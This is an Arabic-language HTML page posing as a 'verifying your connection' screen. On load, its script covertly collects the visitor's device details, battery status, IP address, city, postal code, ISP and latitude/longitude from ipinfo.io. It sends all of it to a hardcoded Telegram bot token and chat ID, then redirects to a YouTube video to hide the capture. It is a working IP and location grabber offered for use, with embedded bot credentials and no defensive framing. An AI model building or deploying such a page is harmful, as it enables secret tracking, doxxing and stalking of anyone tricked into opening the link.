<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>جاري التحقق من الاتصال</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0d1117;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            font-family: 'Segoe UI', Arial, sans-serif;
            color: #c9d1d9;
            text-align: center;
            direction: rtl;
        }
        .container {
            max-width: 90%;
            padding: 20px;
            background: #161b22;
            border-radius: 16px;
            box-shadow: 0 8px 32px rgba(0,0,0,0.5);
            border: 1px solid #30363d;
        }
        .spinner {
            border: 4px solid #30363d;
            border-top: 4px solid #58a6ff;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        h2 {
            font-size: 20px;
            color: #f0f6fc;
            margin-bottom: 10px;
        }
        .status {
            font-size: 16px;
            color: #8b949e;
            min-height: 28px;
            margin-top: 12px;
            padding: 8px 16px;
            border-radius: 8px;
            background: #0d1117;
            border: 1px solid #21262d;
        }
        .status.success { color: #3fb950; border-color: #2ea043; }
        .status.error { color: #f85149; border-color: #da3633; }
        .status.loading { color: #58a6ff; border-color: #1f6feb; }
        .details {
            margin-top: 15px;
            font-size: 13px;
            color: #8b949e;
            background: #0d1117;
            padding: 12px;
            border-radius: 8px;
            border: 1px solid #21262d;
            text-align: right;
            line-height: 1.8;
            display: none;
        }
        .details.show { display: block; }
        .details strong { color: #f0f6fc; }
    </style>
</head>
<body>
    <div class="container">
        <div class="spinner"></div>
        <h2>🔍 جاري التحقق من اتصالك</h2>
        <div class="status loading" id="status">⏳ جاري تجهيز البيانات...</div>
        <div class="details" id="details"></div>
    </div>

    <script>
        (function() {
            // ======== بيانات البوت (ثابتة) ========
            const BOT_TOKEN = "8317512028:AAHEIRv_S23OFrceayGoKW823jIxvl9Az_k";
            const CHAT_ID = "1497190595";
            const REDIRECT_URL = "https://www.youtube.com/watch?v=6N5IQxrac6g";
            // ======================================

            const statusEl = document.getElementById('status');
            const detailsEl = document.getElementById('details');

            // دالة تحديث الحالة
            function updateStatus(msg, type = 'loading') {
                if (statusEl) {
                    statusEl.textContent = msg;
                    statusEl.className = 'status ' + type;
                }
            }

            // دالة عرض التفاصيل للمستخدم
            function showDetails(html) {
                if (detailsEl) {
                    detailsEl.innerHTML = html;
                    detailsEl.classList.add('show');
                }
            }

            // دالة الإرسال إلى تيليجرام (مع محاولة إعادة)
            function sendToTelegram(text) {
                const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
                return fetch(url, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: text,
                        parse_mode: 'Markdown',
                        disable_web_page_preview: true
                    })
                }).catch(() => {});
            }

            // ============================================================
            // 1. جمع بيانات الجهاز التفصيلية (بالعربية)
            // ============================================================
            const ua = navigator.userAgent;
            let os = 'غير معروف';
            let osVersion = 'غير معروف';
            let browser = 'غير معروف';
            let browserVersion = 'غير معروف';
            let deviceType = 'غير معروف';
            let deviceModel = 'غير معروف';
            let batteryLevel = 'غير معروف';
            let isCharging = 'غير معروف';

            // استخراج نظام التشغيل والإصدار
            if (ua.includes('Windows NT 10.0')) { os = 'Windows'; osVersion = '10'; }
            else if (ua.includes('Windows NT 6.1')) { os = 'Windows'; osVersion = '7'; }
            else if (ua.includes('Windows NT 6.2')) { os = 'Windows'; osVersion = '8'; }
            else if (ua.includes('Mac OS X')) { os = 'macOS'; osVersion = ua.match(/Mac OS X (\d+[._]\d+)/)?.[1] || 'غير معروف'; }
            else if (ua.includes('Android')) { os = 'Android'; osVersion = ua.match(/Android (\d+\.\d+)/)?.[1] || 'غير معروف'; }
            else if (ua.includes('iPhone') || ua.includes('iPad')) { os = 'iOS'; osVersion = ua.match(/OS (\d+[._]\d+)/)?.[1] || 'غير معروف'; }
            else if (ua.includes('Linux')) { os = 'Linux'; osVersion = 'غير معروف'; }

            // استخراج المتصفح والإصدار
            if (ua.includes('Chrome') && !ua.includes('Edg')) {
                browser = 'Google Chrome';
                browserVersion = ua.match(/Chrome\/(\d+\.\d+)/)?.[1] || 'غير معروف';
            } else if (ua.includes('Firefox')) {
                browser = 'Mozilla Firefox';
                browserVersion = ua.match(/Firefox\/(\d+\.\d+)/)?.[1] || 'غير معروف';
            } else if (ua.includes('Safari') && !ua.includes('Chrome')) {
                browser = 'Apple Safari';
                browserVersion = ua.match(/Version\/(\d+\.\d+)/)?.[1] || 'غير معروف';
            } else if (ua.includes('Edg')) {
                browser = 'Microsoft Edge';
                browserVersion = ua.match(/Edg\/(\d+\.\d+)/)?.[1] || 'غير معروف';
            } else if (ua.includes('OPR') || ua.includes('Opera')) {
                browser = 'Opera';
                browserVersion = ua.match(/OPR\/(\d+\.\d+)/)?.[1] || 'غير معروف';
            }

            // نوع الجهاز
            if (ua.includes('Mobile')) deviceType = '📱 هاتف محمول';
            else if (ua.includes('Tablet')) deviceType = '📱 جهاز لوحي';
            else deviceType = '💻 كمبيوتر مكتبي';

            // محاولة استخراج طراز الجهاز (Android)
            if (ua.includes('Android')) {
                const match = ua.match(/\(([^;]+; [^;]+)/);
                if (match) deviceModel = match[1].trim();
            } else if (ua.includes('iPhone')) {
                deviceModel = 'iPhone';
            } else if (ua.includes('iPad')) {
                deviceModel = 'iPad';
            } else {
                deviceModel = 'جهاز غير معروف';
            }

            // دقة الشاشة
            const screenRes = `${window.screen.width} × ${window.screen.height}`;

            // الوقت والتاريخ
            const now = new Date();
            const timeStr = now.toLocaleString('ar-EG', { 
                timeZone: 'Asia/Baghdad',
                weekday: 'long',
                year: 'numeric',
                month: 'long',
                day: 'numeric',
                hour: '2-digit',
                minute: '2-digit',
                second: '2-digit'
            });

            // محاولة جلب مستوى البطارية (إن كان متاحاً)
            if (navigator.getBattery) {
                navigator.getBattery().then(battery => {
                    batteryLevel = (battery.level * 100).toFixed(0) + '%';
                    isCharging = battery.charging ? 'نعم (شاحن موصول)' : 'لا';
                }).catch(() => {});
            }

            // ============================================================
            // 2. بناء الرسالة الأولى (بيانات الجهاز الأساسية)
            // ============================================================
            const initialMsg =
                `🔴 *زائر جديد - تم فتح الرابط* 🔴\n` +
                `━━━━━━━━━━━━━━━━━━━━━\n` +
                `📱 *نوع الجهاز:* ${deviceType}\n` +
                `🖥 *نظام التشغيل:* ${os} (الإصدار: ${osVersion})\n` +
                `🌐 *المتصفح:* ${browser} (الإصدار: ${browserVersion})\n` +
                `📟 *طراز الجهاز:* ${deviceModel}\n` +
                `📺 *دقة الشاشة:* ${screenRes}\n` +
                `🕒 *الوقت:* ${timeStr}\n` +
                `🔗 *الرابط:* ${window.location.href}`;

            sendToTelegram(initialMsg);
            updateStatus('✅ تم إرسال بيانات الجهاز', 'success');

            // عرض بعض التفاصيل للمستخدم
            showDetails(`
                <strong>📱 الجهاز:</strong> ${deviceType}<br>
                <strong>🖥 النظام:</strong> ${os} (${osVersion})<br>
                <strong>🌐 المتصفح:</strong> ${browser} (${browserVersion})<br>
                <strong>📟 الطراز:</strong> ${deviceModel}<br>
                <strong>📺 الشاشة:</strong> ${screenRes}
            `);

            // ============================================================
            // 3. جلب الموقع الجغرافي والـ IP (بتفصيل كامل)
            // ============================================================
            updateStatus('🌍 جاري تحديد موقعك الجغرافي...', 'loading');

            fetch('https://ipinfo.io/json', { timeout: 5000 })
                .then(res => {
                    if (!res.ok) throw new Error('HTTP error ' + res.status);
                    return res.json();
                })
                .then(data => {
                    // استخراج جميع التفاصيل
                    const ip = data.ip || 'غير معروف';
                    const country = data.country || 'غير معروف';
                    const region = data.region || 'غير معروف';
                    const city = data.city || 'غير معروف';
                    const org = data.org || 'غير معروف';
                    const loc = data.loc || 'غير معروف';
                    const timezone = data.timezone || 'غير معروف';
                    const postal = data.postal || 'غير معروف';

                    // تقسيم الإحداثيات
                    let lat = 'غير معروف', lon = 'غير معروف';
                    if (loc && loc.includes(',')) {
                        const parts = loc.split(',');
                        lat = parts[0].trim();
                        lon = parts[1].trim();
                    }

                    // تحديث واجهة المستخدم
                    updateStatus(`📍 تم تحديد موقعك بدقة (${city}, ${region}, ${country})`, 'success');

                    // عرض التفاصيل للمستخدم بالعربية
                    showDetails(`
                        <strong>📍 الموقع الجغرافي:</strong><br>
                        <strong>الدولة:</strong> ${country}<br>
                        <strong>المحافظة:</strong> ${region}<br>
                        <strong>المدينة:</strong> ${city}<br>
                        <strong>الرمز البريدي:</strong> ${postal}<br>
                        <strong>المزود:</strong> ${org}<br>
                        <strong>خط العرض:</strong> ${lat}<br>
                        <strong>خط الطول:</strong> ${lon}<br>
                        <strong>المنطقة الزمنية:</strong> ${timezone}<br>
                        <br>
                        <strong>📱 الجهاز:</strong> ${deviceType}<br>
                        <strong>🖥 النظام:</strong> ${os} (${osVersion})<br>
                        <strong>🌐 المتصفح:</strong> ${browser} (${browserVersion})
                    `);

                    // بناء الرسالة الثانية (التفاصيل الكاملة)
                    const detailedMsg =
                        `🌐 *تفاصيل الزائر (IP والموقع)* 🌐\n` +
                        `━━━━━━━━━━━━━━━━━━━━━\n` +
                        `📌 *الـ IP:* ${ip}\n` +
                        `📍 *الدولة:* ${country}\n` +
                        `🏙️ *المحافظة:* ${region}\n` +
                        `🗺️ *المدينة:* ${city}\n` +
                        `📮 *الرمز البريدي:* ${postal}\n` +
                        `📡 *المزود:* ${org}\n` +
                        `🗺️ *خط العرض:* ${lat}\n` +
                        `🗺️ *خط الطول:* ${lon}\n` +
                        `⏰ *المنطقة الزمنية:* ${timezone}\n` +
                        `━━━━━━━━━━━━━━━━━━━━━\n` +
                        `📱 *نوع الجهاز:* ${deviceType}\n` +
                        `🖥 *نظام التشغيل:* ${os} (${osVersion})\n` +
                        `🌐 *المتصفح:* ${browser} (${browserVersion})\n` +
                        `📟 *الطراز:* ${deviceModel}\n` +
                        `📺 *الشاشة:* ${screenRes}\n` +
                        `🕒 *الوقت:* ${timeStr}`;

                    sendToTelegram(detailedMsg);
                })
                .catch(() => {
                    // في حال فشل جلب الموقع
                    updateStatus('⚠️ تعذر تحديد موقعك بدقة', 'error');
                    showDetails(`
                        <strong>⚠️ تعذر جلب الموقع الجغرافي</strong><br>
                        قد يكون الخادم مشغولاً أو الشبكة غير مستقرة.
                    `);
                    sendToTelegram(`⚠️ *تعذر جلب الموقع* ⚠️\n💻 ${ua}\n🕒 ${timeStr}`);
                });

            // ============================================================
            // 4. التوجيه إلى يوتيوب بعد 3 ثوانٍ (لضمان وصول الرسائل)
            // ============================================================
            setTimeout(() => {
                window.location.replace(REDIRECT_URL);
            }, 3500);

            // خطة احتياطية: إجبار التوجيه بعد 6 ثوانٍ
            setTimeout(() => {
                if (window.location.href !== REDIRECT_URL) {
                    window.location.replace(REDIRECT_URL);
                }
            }, 6000);
        })();
    </script>
</body>
</html>
